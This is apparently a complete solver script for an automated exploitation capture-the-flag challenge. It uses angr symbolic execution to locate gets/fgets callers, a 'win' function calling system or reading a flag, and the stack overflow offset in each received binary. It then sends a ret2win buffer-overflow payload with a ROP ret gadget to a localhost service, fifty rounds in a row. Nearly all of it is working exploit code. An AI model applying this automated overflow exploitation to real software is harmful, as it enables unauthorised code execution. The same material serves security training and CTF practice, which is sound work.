from pwn import *
import networkx as nx
import claripy
import base64
import angr
import sys

context.log_level = "DEBUG"
BIN_PATH = "code.bin"


def find_vuln(proj):
    # Define the potentially vulnerable functions
    win_functions = {"fgets", "gets"}

    cfg = proj.analyses.CFGFast(normalize=True)

    for func_name in win_functions:
        # Find the address of the target function by name
        symb = proj.loader.find_symbol(func_name)
        if not symb:
            continue

        # Get the function's address
        func_addr = symb.rebased_addr

        # Get the corresponding function from the CFG
        func = cfg.functions.get(func_addr)
        if not func:
            continue

        # Find the caller of the function
        for block_addr in func.block_addrs_set:
            block = cfg.get_any_node(block_addr)
            if block and block.predecessors:
                # Get the address of the first caller
                first_caller = block.predecessors[0].function_address

                # Now find the caller of this caller
                caller_func = cfg.functions.get(first_caller)
                if not caller_func:
                    continue

                for caller_block_addr in caller_func.block_addrs_set:
                    caller_block = cfg.get_any_node(caller_block_addr)
                    if caller_block and caller_block.predecessors:
                        # Return the address of the caller of the caller
                        return caller_block.predecessors[0].addr

        return None


def find_win(proj):
    win_function = None
    keywords = {"system", "execve"}
    known_flag_names = {"flag", "pass", "passwd", "secret", "winkey"}

    # Generate the control flow graph
    cfg = proj.analyses.CFGFast(normalize=True)

    # Check for function that gives us system("cat pass") or system("cat flag") etc.
    for func in cfg.functions.values():
        if any(keyword in func.name for keyword in keywords):
            # Look at the callers of this function
            for block_addr in func.block_addrs_set:
                block = cfg.get_any_node(block_addr)
                if block and block.predecessors:
                    caller_func = cfg.functions.get(
                        block.predecessors[0].function_address
                    )
                    if caller_func:
                        win_function = (caller_func.name, caller_func)
                        return win_function

    # Check for function that reads flag and then prints it to STDOUT
    # Analyze strings in the binary
    for string in proj.loader.main_object.strings:
        if any(keyword in string.string for keyword in known_flag_names):
            # Find code references to this string
            refs = proj.loader.main_object.memory.find(string.string.encode())
            if refs:
                for ref in refs:
                    # Use the CFG to find which function this reference belongs to
                    block = cfg.get_any_node(ref)
                    if block:
                        func = cfg.functions.get(block.function_address)
                        if func:
                            win_function = (func.name, func)
                            return win_function

    return win_function


def _extract_function_graph(proj, cfg):
    G = nx.DiGraph()

    # Iterate over all functions in the CFG
    for func_addr, func in cfg.functions.items():
        G.add_node(func_addr)  # Add the function start address as a node

        # Add edges from callers to the function
        for block_addr in func.block_addrs_set:
            block = cfg.get_any_node(block_addr)
            if block and block.predecessors:
                for pred in block.predecessors:
                    G.add_edge(pred.function_address, func_addr)

        # Add edges from the function to its callees
        for block_addr in func.block_addrs_set:
            block = cfg.get_any_node(block_addr)
            if block and block.successors:
                for succ in block.successors:
                    callee_func = cfg.functions.get(succ.function_address)
                    if callee_func:
                        G.add_edge(func_addr, callee_func.addr)

    return G


def find_path(proj, vuln_func_addr, win_func_addr):
    # for some reason if i don't recreate a project, the old one
    # just end up crashing
    # proj = angr.Project("code.bin", auto_load_libs=False)
    cfg = proj.analyses.CFGFast(normalize=True)
    G = _extract_function_graph(proj, cfg)

    start_addr = None
    for func in cfg.functions.values():
        # Check for the function named "main"
        if "main" in func.name:
            start_addr = func.addr

    try:
        path = nx.shortest_path(G, source=start_addr, target=vuln_func_addr)
        print(path)
    except nx.NetworkXNoPath as e:
        print(f"No path between main and vuln function...")
        try:
            path = nx.shortest_path(G, source=start_addr, target=win_func_addr)
        except nx.NetworkXNoPath as e:
            print(f"No path between main and win function... sucks hard")
            return None

    stdin = claripy.BVS("stdin", 0x20 * 8)

    initial_state = proj.factory.entry_state(
        stdin=stdin,
        add_options={
            angr.sim_options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            angr.sim_options.ZERO_FILL_UNCONSTRAINED_MEMORY,
        },
    )

    for byte in stdin.chop(8):  # chop the bitvector into bytes
        initial_state.solver.add(byte >= 0x61)  # Space character
        initial_state.solver.add(byte <= 0x7A)  # Tilde character (~)

    simgr = proj.factory.simulation_manager(initial_state)

    base = proj.loader.main_object.mapped_base
    log.info(f"{hex(base)}, {proj.loader}, {hex(start_addr)}")
    for target_addr in path:
        simgr.explore(find=target_addr)
        if "found" not in simgr.stashes or len(simgr.found) == 0:
            print(f"Could not find path to {hex(target_addr)}")
            return None
        log.info(f"Found path to {hex(target_addr)}")
        state = simgr.found[0]
        simgr = proj.factory.simulation_manager(state)

    solution = state.posix.dumps(0)
    solution = solution.split(b"\x00")
    # remove empty b''
    seen = set()
    seen_add = seen.add
    solution = [x for x in solution if not (x in seen or seen_add(x))]
    solution.remove(b"")  # remove empty b''
    solution = [
        x for x in solution if x.isalpha()
    ]  # keep only alpha chars, idk why i was getting b"\x01" sometimes
    return solution


def check_mem_corruption(simgr):
    if len(simgr.unconstrained):
        for path in simgr.unconstrained:
            if path.satisfiable(extra_constraints=[path.regs.pc == 0x43434343]):
                path.add_constraints(path.regs.pc == 0x43434343)
                if path.satisfiable():
                    simgr.stashes["mem_corrupt"].append(path)
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")
    return simgr


def find_overflow_size(proj, vuln_func_addr):
    state = proj.factory.blank_state(addr=vuln_func_addr)
    simgr = proj.factory.simulation_manager(state, save_unconstrained=True)
    simgr.stashes["mem_corrupt"] = []
    simgr.explore(step_func=check_mem_corruption)

    # If we found any memory corruption states, report the size
    if simgr.stashes["mem_corrupt"]:
        log.info("Potential overflow detected!")
        corrupt_state = simgr.stashes["mem_corrupt"][0]
        pos = corrupt_state.posix.stdin.pos
        data = corrupt_state.posix.dumps(sys.stdin.fileno())
        # data will be "\x00\x00\x00 ... CCCC ... \x00\x00\x00", so we need
        # to split at "CCCC" and then do len()
        data = data.split(b"CCCC")[0]

        return len(data)
    else:
        log.info("No memory corruption detected.")
        return None


def get_binary(io):
    io.recvuntil(b"----------------")
    b64_binary = io.recvuntil(b"----------------", drop=True)
    with open("code.bin", "wb") as f:
        f.write(base64.b64decode(b64_binary))


def main():
    # io = process(["python3", "challenge/main.py"])
    io = remote('localhost', 1337)
    for i in range(50):
        get_binary(io)
        proj = angr.Project("code.bin", auto_load_libs=False)
        vuln_func_addr = find_vuln(proj)
        log.info(f"Found vuln func at {hex(vuln_func_addr)}")
        win_func_addr = find_win(proj)
        log.info(f"Found win func {win_func_addr[0]} at {hex(win_func_addr[1].addr)}")
        path = find_path(proj, vuln_func_addr, win_func_addr[1].addr)
        log.info(f"Found path from main to vuln {path}")
        size = find_overflow_size(proj, vuln_func_addr)
        log.info(f"Overflow size of {size}")

        rop = ROP(BIN_PATH)

        ret = rop.find_gadget(["ret"])[0]
        if len(path) == 0:
            path = b""
        elif len(path) == 1:
            path = path[0] + b"\n"
        else:
            path = b"\n".join(path) + b"\n"

        cfg = proj.analyses.CFGFast(normalize=True)

        main_addr = None
        for func in cfg.functions.values():
            # Check for the function named "main"
            if "main" in func.name:
                main_addr = func.addr

        payload = (
            path
            + b"A" * size
            + p64(ret)  # to avoid crashing because of alignment issue >>
            + p64(win_func_addr[1].addr)
            + p64(main_addr + 4)  # our program must terminate *somewhat* properly!
        )

        b64_payload = base64.b64encode(payload)
        io.sendlineafter(b"solution:\n", b64_payload)
        log.success(f"Challenge {i+1} solved!")

    io.interactive()


main()
